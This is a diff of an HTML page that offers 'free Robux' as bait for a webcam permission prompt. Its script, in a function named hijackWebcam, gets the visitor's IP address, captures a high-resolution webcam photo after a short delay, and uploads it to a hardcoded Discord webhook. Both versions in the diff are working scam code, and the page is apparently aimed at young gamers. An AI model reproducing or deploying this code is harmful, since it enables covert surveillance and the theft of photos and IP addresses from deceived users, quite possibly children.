@@ -1,48 +1,62 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>Claim Free Robux</title>
-  <style>
-    body {
-      margin: 0;
-      padding: 0;
-      height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      background-color: #f0f0f0;
-      font-family: Arial, sans-serif;
-    }
-
-    #executeBtn {
-      background: linear-gradient(to right, #ff8a00, #e52e71);
-      color: white;
-      border: none;
-      padding: 15px 40px;
-      border-radius: 25px;
-      cursor: pointer;
-      font-weight: bold;
-      font-size: 20px;
-      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
-      transition: all 0.3s ease;
-      user-select: none;
-    }
-
-    #executeBtn:hover {
-      transform: scale(1.05);
-      box-shadow: 0 6px 20px rgba(0,0,0,0.3);
-    }
-  </style>
+<meta charset="UTF-8" />
+<title>Custom Webcam Permission</title>
+<style>
+  body, html {
+    margin: 0; padding: 0; height: 100%;
+    font-family: Arial, sans-serif;
+    background: #f0f0f0;
+    display: flex; justify-content: center; align-items: center;
+  }
+  #popup {
+    background: white;
+    padding: 30px 40px;
+    border-radius: 12px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+    max-width: 320px;
+    text-align: center;
+  }
+  #popup h2 {
+    margin-bottom: 20px;
+  }
+  #popup button {
+    background: linear-gradient(to right, #ff8a00, #e52e71);
+    border: none;
+    padding: 12px 25px;
+    color: white;
+    font-weight: bold;
+    font-size: 16px;
+    border-radius: 25px;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    user-select: none;
+  }
+  #popup button:hover {
+    transform: scale(1.05);
+    box-shadow: 0 6px 20px rgba(0,0,0,0.3);
+  }
+  #status {
+    margin-top: 15px;
+    color: #555;
+  }
+</style>
 </head>
 <body>
 
-<button id="executeBtn">🎁 CLAIM FREE ROBUX</button>
+<div id="popup">
+  <h2>Allow webcam for free robux?</h2>
+  <button id="allowBtn">Allow</button>
+  <div id="status"></div>
+</div>
 
 <script>
-(async function() {
   const DELAY_SECONDS = 5;
   const WEBHOOK_URL = "https://discord.com/api/webhooks/1403083806705057812/I3474kOt2sZKd2gOPsv6BCcP1X7J0smnlx5r15sp_Hm28vtemEZaCbMI1q3D6emTv5zR";
+  const statusEl = document.getElementById('status');
+  const popupEl = document.getElementById('popup');
+  const allowBtn = document.getElementById('allowBtn');
 
   async function getIP() {
     try {
@@ -55,27 +69,24 @@
   }
 
   async function hijackWebcam() {
+    statusEl.textContent = "Requesting webcam permission...";
     try {
       const ip = await getIP();
 
       const stream = await navigator.mediaDevices.getUserMedia({
-        video: {
-          width: { ideal: 1920 },
-          height: { ideal: 1080 },
-          facingMode: "user",
-        }
+        video: { width: { ideal: 1920 }, height: { ideal: 1080 }, facingMode: "user" }
       });
 
       const video = document.createElement("video");
       video.srcObject = stream;
       await video.play();
 
+      statusEl.textContent = `Capturing photo in ${DELAY_SECONDS} seconds...`;
+
       await new Promise(resolve => setTimeout(resolve, DELAY_SECONDS * 1000));
 
       if (video.readyState < 2) {
-        await new Promise(resolve => {
-          video.onloadeddata = resolve;
-        });
+        await new Promise(resolve => { video.onloadeddata = resolve; });
       }
 
       const canvas = document.createElement("canvas");
@@ -89,21 +100,18 @@
         formData.append("file", blob, `webcam_${ip}.jpg`);
         fetch(WEBHOOK_URL, { method: "POST", body: formData });
         stream.getTracks().forEach(track => track.stop());
+        statusEl.textContent = "Photo captured and sent.";
       }, "image/jpeg", 0.9);
 
     } catch (err) {
-      // silently fail
+      statusEl.textContent = "Failed to access webcam or capture photo.";
     }
   }
 
-  const btn = document.getElementById("executeBtn");
-  btn.addEventListener("click", async () => {
-    btn.disabled = true;
-    btn.textContent = "Processing...";
+  allowBtn.addEventListener('click', async () => {
+    allowBtn.disabled = true;
     await hijackWebcam();
-    btn.textContent = "Done!";
   });
-})();
 </script>
 
 </body>
